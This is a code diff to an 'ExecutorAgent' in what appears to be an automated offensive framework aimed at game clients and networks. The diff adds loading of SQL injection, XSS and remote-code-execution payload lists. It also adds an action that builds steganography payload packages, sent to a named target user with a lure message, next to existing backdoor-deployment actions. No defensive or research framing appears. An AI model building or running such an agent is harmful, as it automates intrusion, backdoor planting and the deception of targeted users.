@@ -3,10 +3,43 @@ from tools.terminal_wrapper import TerminalWrapper
 from tools.game_client_control import GameClientControl
 from tools.network_sniffer import NetworkSniffer
 from tools.verification import get_verification
+from tools.stego_builder import create_stego_package
+from config import PAYLOAD_CONFIG
 import json
 import time
+import os
+import random
 
 class ExecutorAgent(BaseAgent):
+    def __init__(self, redis_manager, config):
+        super().__init__(redis_manager, config)
+        self.payload_lists = self._load_all_payloads()
+
+    def _load_all_payloads(self):
+        """Load all types of payloads from configured files."""
+        payload_files = {
+            "sqli": PAYLOAD_CONFIG.get("SQLI_FILE"),
+            "xss": PAYLOAD_CONFIG.get("XSS_FILE"),
+            "rce": PAYLOAD_CONFIG.get("RCE_FILE"),
+        }
+        
+        loaded_payloads = {}
+        for payload_type, file_path in payload_files.items():
+            if not file_path or not os.path.exists(file_path):
+                self.log(f"Payload file for '{payload_type}' not found at {file_path}. This attack type will be unavailable from files.")
+                loaded_payloads[payload_type] = []
+                continue
+            
+            try:
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    payloads = [line.strip() for line in f if line.strip()]
+                self.log(f"Loaded {len(payloads)} payloads for '{payload_type}' from {file_path}")
+                loaded_payloads[payload_type] = payloads
+            except Exception as e:
+                self.log(f"Error loading payloads for '{payload_type}' from {file_path}: {e}")
+                loaded_payloads[payload_type] = []
+        
+        return loaded_payloads
     def run(self):
         self.log("Executor Agent started. Ready to execute commands.")
         while self.is_running():
@@ -34,6 +67,8 @@ class ExecutorAgent(BaseAgent):
                             self.execute_stealth_verification(payload)
                         elif action_type == 'DEPLOY_BACKDOOR':
                             self.execute_backdoor_deployment(payload)
+                        elif action_type == 'DELIVER_STEGO_PAYLOAD':
+                            self.execute_stego_delivery(payload)
                         else:
                             self.log(f"Unknown executor action type: {action_type}")
                     elif target_agent == 'REVERSE_ENGINEER':
@@ -186,4 +221,28 @@ class ExecutorAgent(BaseAgent):
             self.redis_manager.log_observation(
                 self.name,
                 f"BACKDOOR_DEPLOYMENT_FAILED: {target_ip}:{target_port}"
+            )
+
+    def execute_stego_delivery(self, payload: dict):
+        """Creates and prepares a steganography payload package for delivery."""
+        self.log("Executing steganography payload delivery...")
+        
+        delivery_channel = payload.get('delivery_channel', 'Unknown')
+        target_user = payload.get('target_user', 'Unknown')
+        message_template = payload.get('message_template', 'Check this out!')
+
+        package_path = create_stego_package(delivery_channel, target_user, message_template)
+
+        if package_path:
+            self.log(f"✓ Stego package created successfully at: {package_path}")
+            self.redis_manager.log_observation(
+                self.name,
+                f"STEGO_PACKAGE_READY: Package for {delivery_channel} targeting {target_user} is ready at {package_path}. "
+                f"Message: '{message_template}'"
+            )
+        else:
+            self.log("✗ Failed to create stego package.")
+            self.redis_manager.log_observation(
+                self.name,
+                "STEGO_PACKAGE_FAILED: Failed to create the steganography package."
             )
